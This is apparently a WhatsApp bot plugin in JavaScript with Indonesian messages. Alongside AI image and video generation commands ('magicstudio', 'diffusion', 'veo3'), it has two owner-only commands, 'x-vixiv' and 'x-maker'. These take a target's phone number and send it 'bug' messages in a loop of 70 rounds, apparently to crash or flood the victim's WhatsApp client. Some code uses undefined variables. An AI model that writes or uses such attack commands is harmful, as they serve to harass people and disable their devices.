// ALICE MULTI DEVICE, AIZAT, MADE IN INDONESIA
module.exports = {
  command: ['magicstudio', 'diffusion', 'x-vixiv', 'x-maker', 'veo3'],
  operate: async (context) => {
    const { Alice, m, text, q, prefix, command, reply, xy, XReaction, isBan, Xban, isOwner, isPrem, XRP, isGroup, isBotAdmins, isAdmins, fs, axios, fetch, cheerio, crypto, db, moment, proto, generateWAMessageFromContent, prepareWAMessageMedia, getBuffer, fetchJson, ownername, botname, channel, pushname, alice, Styles } = context;

    switch (command) {
case 'magicstudio': {
    if (isBan) return XRB()
    await XReaction()
    if (!args[0]) return reply(`Masukkan prompt untuk gambar!\nExample: ${AliceCmd} buatkan gambar wanita sedang memegang botol cocacola sambil menyender di tembok`);

    let prompt = encodeURIComponent(args.join(' '));
    let apiUrl = `https://api.siputzx.my.id/api/ai/magicstudio?prompt=${prompt}`;
    const fs = require('fs');

    try {
        let res = await fetch(apiUrl);
        let contentType = res.headers.get('content-type');

        console.log('Content-Type:', contentType);

        if (contentType && contentType.startsWith('image')) {
            let buffer = await res.buffer();

            // pastikan folder tmp ada
            if (!fs.existsSync('./tmp')) {
                fs.mkdirSync('./tmp');
            }

            // simpan buffer jadi file
            let filePath = `./tmp/${Date.now()}.jpg`;
            fs.writeFileSync(filePath, buffer);

            // kirim file via sendFile (butuh path, bukan buffer)
            await Alice.sendFile(
                m.chat,
                filePath,
                'magicStudio.jpg',
                `Berhasil Membuat Gambar\n${packname}`,
                xy
            );

            // hapus setelah terkirim
            fs.unlinkSync(filePath);

        } else {
            reply('Gagal mendapatkan gambar, API mungkin sedang error.');
        }
    } catch (e) {
        console.error('Fetch Error:', e);
        reply('Terjadi kesalahan saat menghubungi API.');
    }
};
break

case 'diffusion': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply('Apa yang ingin kamu buat?')
await Alice.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}}) 
    try {
 Alice.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
    } catch (error) {
reply('eror')
    }
}
break

case 'x-vixiv': {
if (!isOwner) return XRO()
if (!q) return reply(`Example: ${AliceCmd} Nomor`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"

for (let i = 0; i < 70; i++) {
await img1(target)
await img1(target)
await carousel(target)
await erwin(target)
}
let kucay = `
Done Send Bug To Target\n*© Aizat 2025*`
Alice.sendMessage(m.chat, { image: { url: thumb},
caption: kucay,
gifPlayback: false,
}, { quoted: m });

}
break

case 'x-maker': {
if (!isOwner) return XRO()
if (!q) return reply(`Example: ${AliceCmd} Nomor`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 70; i++) {
await img1(target)
await img1(target)
await carousel(target)
await erwin(target)
}
let memem = `
Done Send Bug To Target\n*© Aizat 2025*`
Alice.sendMessage(m.chat, { image: { url: thumb },
caption: memem,
gifPlayback: false,
}, { quoted: m });
}
break
//📈————————————————————————— [ © Aizat ] —————————————————————————📉\\
//————————————————————————//
// Bug Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\


//📈————————————————————————— [ © Aizat ] —————————————————————————📉\\
//————————————————————————//
// Panel Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\

case 'veo3': {
    if (!isPrem) return XRP();
    await XReaction();
    try {
        if (!text) return reply('Masukkan prompt. Contoh:\n.veo3 kota futuristik dengan AI');

        // panggil API veo3
        const API_URL = 'https://faa-veo.vercel.app/faa/veo3';
        const res = await axios.get(`${API_URL}?prompt=${encodeURIComponent(text)}`);

        if (!res.data) return reply('API tidak mengembalikan hasil');

        // coba ambil link video dari beberapa kemungkinan field
        let videoUrl = res.data.video || res.data.url;

        // kalau belum ketemu, coba scan semua field untuk cari link mp4
        if (!videoUrl) {
            const stringified = JSON.stringify(res.data);
            const match = stringified.match(/https?:\/\/[^\s"]+\.mp4/);
            if (match) videoUrl = match[0];
        }

        if (videoUrl) {
            await Alice.sendMessage(m.chat, {
                video: { url: videoUrl },
                caption: '✅ Video berhasil dibuat dengan VEO3 🎥'
            }, { quoted: m });
        } else {
            reply('❌ Gagal menemukan link video dari API.\nBalikan API:\n' + JSON.stringify(res.data, null, 2));
        }

    } catch (e) {
        reply(`🚨 Eror kak: ${e.message}`);
    }
}
break;
    }
  }
};
